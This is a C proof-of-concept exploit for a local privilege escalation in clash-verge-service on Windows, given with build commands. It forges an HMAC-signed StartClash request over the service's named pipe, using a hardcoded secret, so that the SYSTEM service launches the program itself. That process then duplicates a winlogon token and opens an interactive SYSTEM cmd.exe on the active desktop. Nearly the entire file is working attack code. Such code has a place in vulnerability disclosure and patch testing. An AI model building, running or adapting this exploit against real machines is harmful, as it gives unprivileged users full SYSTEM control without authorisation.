/*
 * clash-verge-service (mainline) local privilege escalation PoC.
 * Unprivileged user -> interactive SYSTEM cmd.exe on the active desktop.
 *
 * Build (MSVC):  cl /O2 poc.c bcrypt.lib advapi32.lib wtsapi32.lib
 * Build (MinGW): x86_64-w64-mingw32-gcc -O2 poc.c -o poc.exe -lbcrypt -ladvapi32 -lwtsapi32
 *
 * Run as a normal user.
 */
#include <windows.h>
#include <bcrypt.h>
#include <wtsapi32.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define PIPE_NAME "\\\\.\\pipe\\clash-verge-service"
#define SECRET    "clash-verge-app-secret-fuck-me-until-daylight"

extern int    __argc;
extern char **__argv;

/* ---------------- BCrypt SHA256 / HMAC-SHA256 ---------------- */
static int bc_hash(LPCWSTR alg, DWORD flags, const unsigned char *key, DWORD keylen,
                   const unsigned char *data, DWORD len, unsigned char out[32]) {
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_HASH_HANDLE hH = NULL;
    DWORD objLen = 0, cb = 0; PUCHAR obj = NULL; int ok = 0;
    if (BCryptOpenAlgorithmProvider(&hAlg, alg, NULL, flags) != 0) return 0;
    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&objLen, sizeof objLen, &cb, 0) != 0) goto done;
    obj = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, objLen);
    if (!obj) goto done;
    if (BCryptCreateHash(hAlg, &hH, obj, objLen, (PUCHAR)key, keylen, 0) != 0) goto done;
    if (BCryptHashData(hH, (PUCHAR)data, len, 0) != 0) goto done;
    if (BCryptFinishHash(hH, out, 32, 0) != 0) goto done;
    ok = 1;
done:
    if (hH) BCryptDestroyHash(hH);
    if (obj) HeapFree(GetProcessHeap(), 0, obj);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}
static int sha256(const unsigned char *d, DWORD n, unsigned char o[32]) {
    return bc_hash(BCRYPT_SHA256_ALGORITHM, 0, NULL, 0, d, n, o);
}
static int hmac256(const unsigned char *k, DWORD kn, const unsigned char *d, DWORD n, unsigned char o[32]) {
    return bc_hash(BCRYPT_SHA256_ALGORITHM, BCRYPT_ALG_HANDLE_HMAC_FLAG, k, kn, d, n, o);
}
static void hex32(const unsigned char *b, char *o) {
    const char *H = "0123456789abcdef";
    for (int i = 0; i < 32; i++) { o[i*2] = H[b[i] >> 4]; o[i*2+1] = H[b[i] & 15]; }
    o[64] = 0;
}

/* ---------------- helpers ---------------- */
static int is_system(void) {
    HANDLE t; int r = 0; DWORD n = 0;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t)) return 0;
    GetTokenInformation(t, TokenUser, NULL, 0, &n);
    PTOKEN_USER tu = (PTOKEN_USER)LocalAlloc(LPTR, n);
    if (tu && GetTokenInformation(t, TokenUser, tu, n, &n)) {
        BYTE sid[SECURITY_MAX_SID_SIZE]; DWORD sl = sizeof sid;
        if (CreateWellKnownSid(WinLocalSystemSid, NULL, sid, &sl)) r = EqualSid(tu->User.Sid, (PSID)sid);
    }
    if (tu) LocalFree(tu); CloseHandle(t); return r;
}
static void enable_priv(LPCWSTR name) {
    HANDLE t; LUID l; TOKEN_PRIVILEGES tp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &t)) return;
    if (LookupPrivilegeValueW(NULL, name, &l)) {
        tp.PrivilegeCount = 1; tp.Privileges[0].Luid = l; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(t, FALSE, &tp, sizeof tp, NULL, NULL);
    }
    CloseHandle(t);
}
static void jesc(const char *in, char *out, size_t n) {
    size_t j = 0;
    for (size_t i = 0; in[i] && j + 2 < n; i++) { if (in[i] == '\\' || in[i] == '"') out[j++] = '\\'; out[j++] = in[i]; }
    out[j] = 0;
}

/* ---------------- SYSTEM payload: interactive cmd in the active session ---------------- */
static DWORD interactive_session(void) {
    DWORD s = WTSGetActiveConsoleSessionId();
    if (s != 0xFFFFFFFF && s != 0) return s;
    PWTS_SESSION_INFOW si = NULL; DWORD c = 0, found = s;
    if (WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, &si, &c)) {
        for (DWORD i = 0; i < c; i++)
            if (si[i].State == WTSActive && si[i].SessionId != 0) { found = si[i].SessionId; break; }
        WTSFreeMemory(si);
    }
    return found;
}
static int spawn_cmd(HANDLE userTok, DWORD sess) {
    HANDLE dup;
    if (!DuplicateTokenEx(userTok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dup)) return 0;
    SetTokenInformation(dup, TokenSessionId, &sess, sizeof sess);
    wchar_t cmd[MAX_PATH]; GetSystemDirectoryW(cmd, MAX_PATH); lstrcatW(cmd, L"\\cmd.exe");
    STARTUPINFOW si; ZeroMemory(&si, sizeof si); si.cb = sizeof si;
    si.lpDesktop = (LPWSTR)L"winsta0\\default"; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_SHOW;
    PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof pi);
    BOOL ok = CreateProcessAsUserW(dup, cmd, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    if (ok) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    CloseHandle(dup); return ok;
}
static HANDLE winlogon_token(DWORD sess) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (snap == INVALID_HANDLE_VALUE) return NULL;
    PROCESSENTRY32W pe; pe.dwSize = sizeof pe; HANDLE tok = NULL;
    if (Process32FirstW(snap, &pe)) do {
        if (lstrcmpiW(pe.szExeFile, L"winlogon.exe") == 0) {
            DWORD s = 0; ProcessIdToSessionId(pe.th32ProcessID, &s);
            if (s == sess) {
                HANDLE ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
                if (ph) {
                    OpenProcessToken(ph, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY |
                                     TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, &tok);
                    CloseHandle(ph); if (tok) break;
                }
            }
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap); return tok;
}
static int has_t_flag(void) {
    for (int i = 1; i < __argc; i++)
        if (__argv[i] && strcmp(__argv[i], "-t") == 0) return 1;
    return 0;
}
static int payload(void) {
    /* Pop only during the "-t" config-test spawn: exactly one window per StartClash, repeatable. */
    if (!has_t_flag()) return 0;
    enable_priv(L"SeDebugPrivilege");  enable_priv(L"SeTcbPrivilege");
    enable_priv(L"SeAssignPrimaryTokenPrivilege"); enable_priv(L"SeIncreaseQuotaPrivilege");
    DWORD sess = interactive_session();
    int done = 0; HANDLE wt = winlogon_token(sess);
    if (wt) { done = spawn_cmd(wt, sess); CloseHandle(wt); }
    if (!done) {
        HANDLE me;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY |
                TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, &me)) {
            spawn_cmd(me, sess); CloseHandle(me);
        }
    }
    return 0;
}

/* ---------------- message-mode pipe transaction: [u32 BE len][json] ---------------- */
static int read_n(HANDLE p, unsigned char *b, DWORD n) {
    DWORD t = 0, r;
    while (t < n) { if (!ReadFile(p, b + t, n - t, &r, NULL) || r == 0) return 0; t += r; }
    return 1;
}
static int pipe_txn(const unsigned char *req, int reqlen, char *resp, int respcap) {
    HANDLE p; int tries = 0;
    for (;;) {
        p = CreateFileA(PIPE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (p != INVALID_HANDLE_VALUE) break;
        if (GetLastError() == ERROR_PIPE_BUSY && ++tries < 10) { WaitNamedPipeA(PIPE_NAME, 5000); continue; }
        printf("[-] CreateFile err=%lu (service running?)\n", GetLastError()); return -1;
    }
    DWORD mode = PIPE_READMODE_BYTE | PIPE_WAIT; SetNamedPipeHandleState(p, &mode, NULL, NULL);
    unsigned char lp[4] = { (unsigned char)(reqlen >> 24), (unsigned char)(reqlen >> 16),
                            (unsigned char)(reqlen >> 8), (unsigned char)reqlen };
    DWORD w;
    if (!WriteFile(p, lp, 4, &w, NULL))       { printf("[-] write len err=%lu\n", GetLastError());  CloseHandle(p); return -1; }
    if (!WriteFile(p, req, reqlen, &w, NULL)) { printf("[-] write body err=%lu\n", GetLastError()); CloseHandle(p); return -1; }
    FlushFileBuffers(p);
    unsigned char rl[4];
    if (!read_n(p, rl, 4)) { printf("[i] no response (err=%lu)\n", GetLastError()); CloseHandle(p); return 0; }
    DWORD blen = ((DWORD)rl[0] << 24) | ((DWORD)rl[1] << 16) | ((DWORD)rl[2] << 8) | rl[3];
    if (blen > (DWORD)respcap - 1) blen = respcap - 1;
    int got = read_n(p, (unsigned char *)resp, blen) ? (int)blen : 0;
    resp[got] = 0; CloseHandle(p); return got;
}

/* ---------------- unprivileged launcher ---------------- */
static int launcher(void) {
    unsigned char key[32];
    if (!sha256((const unsigned char *)SECRET, (DWORD)strlen(SECRET), key)) { printf("[-] sha256 failed\n"); return 1; }

    char self[MAX_PATH], selfe[MAX_PATH * 2];
    GetModuleFileNameA(NULL, self, MAX_PATH); jesc(self, selfe, sizeof selfe);

    char windir[MAX_PATH], logp[MAX_PATH], loge[MAX_PATH * 2];
    GetWindowsDirectoryA(windir, MAX_PATH);
    snprintf(logp, sizeof logp, "%s\\Temp\\cvs.log", windir);
    jesc(logp, loge, sizeof loge);

    /* payload keys in lexical order so the server's canonical re-serialization matches our signed bytes */
    char prefix[4096];
    unsigned long long ts = (unsigned long long)time(NULL);
    snprintf(prefix, sizeof prefix,
        "{\"id\":\"poc-1\",\"timestamp\":%llu,\"command\":\"StartClash\",\"payload\":{"
        "\"bin_path\":\"%s\",\"config_dir\":\"x\",\"config_file\":\"x\","
        "\"core_type\":\"clash\",\"log_file\":\"%s\"}",
        ts, selfe, loge);

    char signbuf[4200];
    int sn = snprintf(signbuf, sizeof signbuf, "%s,\"signature\":\"\"}", prefix);
    unsigned char mac[32]; char hex[65];
    if (!hmac256(key, 32, (unsigned char *)signbuf, sn, mac)) { printf("[-] hmac failed\n"); return 1; }
    hex32(mac, hex);

    char sendbuf[4300];
    int dn = snprintf(sendbuf, sizeof sendbuf, "%s,\"signature\":\"%s\"}", prefix, hex);

    printf("[*] bin_path = %s\n", self);
    char resp[8192];
    int n = pipe_txn((unsigned char *)sendbuf, dn, resp, sizeof resp);
    printf("[+] response (%d bytes): %s\n", n, n > 0 ? resp : "(none)");
    printf("[*] If the service runs as SYSTEM, a SYSTEM cmd.exe should appear on the active desktop.\n");
    return 0;
}

int main(void) { return is_system() ? payload() : launcher(); }